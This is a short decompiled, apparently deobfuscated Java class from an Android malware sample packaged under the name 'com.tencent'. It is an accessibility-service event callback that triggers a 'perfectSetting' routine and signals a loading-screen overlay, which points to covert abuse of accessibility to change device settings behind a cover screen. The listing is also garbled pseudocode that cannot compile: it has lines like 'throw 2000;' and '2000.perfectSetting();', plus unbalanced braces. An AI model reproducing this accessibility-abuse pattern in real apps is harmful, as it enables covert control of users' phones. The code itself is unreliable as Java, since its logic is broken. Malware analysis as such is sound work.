package com.tencent;

import android.content.*;
import android.view.*;
import android.widget.*;
import android.app.*;
import android.os.*;
import android.accessibilityservice.*;
import android.view.accessibility.*;
import android.telephony.*;
import android.media.*;
import java.util.*;
import java.io.*;
import java.net.*;

/**
 * Deobfuscated class: AccessibilityServiceCore_20
 * Original: Lcom/tencent/tunesxconcerningn1012$20;
 */
class AccessibilityServiceCore_20 implements AccessibilityEventMonitor$ICallback; {

    // === FIELDS ===
    final AccessibilityServiceCore this$0;

    // === METHODS ===

     void Constructor(AccessibilityServiceCore param0) {
        v0.this$0 = v1;
        // new Object()
        return;
    }

    public void onEvent(AccessibilityEventMonitor$Event param0) {
        v1 = v3.getAction();
        v1 = MalwareConstants.Evnet_Type_PerfectSetting;
        v0 = v0.equals(v1);
        if (v0 == null || v0 == 0) { // goto +20
        v0 = 2000;
        Thread.sleep(2000, v1);
        2000.perfectSetting();
        // goto (branch)
        // new RuntimeException(v3)
        throw 2000;
        v3.getAction();
        v3 = v3.equals(2000);
        if (v3 == null || v3 == 0) { // goto +12
        v3 = LoadingScreenOverlay.handler;
        if (v3 == null || v3 == 0) { // goto +8
        v3 = LoadingScreenOverlay.handler;
        v0 = 0;
        v3.sendEmptyMessage(0);
        return;
    }
}
